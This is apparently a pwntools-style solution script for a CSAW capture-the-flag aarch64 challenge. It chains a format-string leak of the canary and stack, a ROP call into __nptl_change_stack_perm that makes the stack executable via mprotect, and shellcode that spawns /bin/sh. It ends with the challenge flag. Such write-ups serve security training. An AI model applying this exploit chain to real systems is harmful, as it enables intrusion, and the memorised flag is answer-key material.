#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.arch = 'aarch64'
exe = context.binary = ELF('./chal', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
set architecture aarch64
b *0x400874
c
'''

def start(argv=[]):
    if args.GDB:
        return process(["qemu-aarch64-static","-g","5000", "-L", "/usr/arm-linux-gnueabi/", exe.path])
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    else:
        return process(["qemu-aarch64-static", "-L", "/usr/arm-linux-gnueabi/", exe.path])


# ==================== EXPLOIT ====================
p = start()

sa(b'Sea of Tranquility!\n', b'%25$p|%26$p')

ru(b'[Houston]: ')
data = rl()[:-1].split(b'|')
canary = hexleak(data[0])
slog('canary @ %#x', canary)

stack_leak = hexleak(data[1])
slog('stack_leak @ %#x', stack_leak)

binsh = stack_leak - 0x10
info('/bin/sh @ %#x', binsh)

'''
   0x0000000000447f70 <+0>:     stp     x29, x30, [sp, #-16]!
   0x0000000000447f74 <+4>:     mov     w2, #0x7                        // #7
   0x0000000000447f78 <+8>:     mov     x29, sp
   0x0000000000447f7c <+12>:    ldr     x3, [x0, #1168]
   0x0000000000447f80 <+16>:    ldr     x1, [x0, #1176]
   0x0000000000447f84 <+20>:    ldr     x0, [x0, #1184]
   0x0000000000447f88 <+24>:    sub     x1, x1, x0
   0x0000000000447f8c <+28>:    add     x0, x3, x0
=> 0x0000000000447f90 <+32>:    bl      0x416a00 <mprotect>
   0x0000000000447f94 <+36>:    cbz     w0, 0x447fa8 <__nptl_change_stack_perm+56>
   0x0000000000447f98 <+40>:    movz    x0, #0x0, lsl #16
   0x0000000000447f9c <+44>:    movk    x0, #0x28
   0x0000000000447fa0 <+48>:    mrs     x1, tpidr_el0
   0x0000000000447fa4 <+52>:    ldr     w0, [x1, x0]
   0x0000000000447fa8 <+56>:    ldp     x29, x30, [sp], #16
   0x0000000000447fac <+60>:    ret
'''

gadget = 0x000000000042aac8 # ldr x0, [sp, #0x60]; ldp x29, x30, [sp], #0x80; ret;
svc = 0x0000000000436588

shellcode = asm("""
    mov     x1, #0x622f
    movk    x1, #0x6e69, lsl #16
    movk    x1, #0x732f, lsl #32
    movk    x1, #0x68,   lsl #48
    str     x1, [sp, #-8]!
    mov     x1, xzr
    mov     x2, xzr
    add     x0, sp, x1
    mov     x8, #0xdd
    svc     #0x1337
""")

print(disasm(shellcode))

payload = p64(binsh & ~0xfff)
payload += p64(0x1000)
payload += p64(0x0)
payload += shellcode
payload = payload.ljust(0x88, b"A")
payload += p64(canary)
payload += b"/bin/sh\x00"  # rbp
payload += p64(gadget)
payload += p64(0)
payload += p64(exe.sym.__nptl_change_stack_perm + 4)
payload += cyclic(0x50, n=8)
payload += p64(binsh - 0x88 - 0x8 - 0x490)
payload += p64(0) * 4
payload += p64(binsh - 8 - 0x88 + 0x18)

pause()
s(payload)

interactive()
# csawctf{7bYhky_0n3_5m411_5h311c0d3_f0r_1nj3ct10n_qokqum_0n3_914n7_ch41n_f0r_r0p_zybdyr}
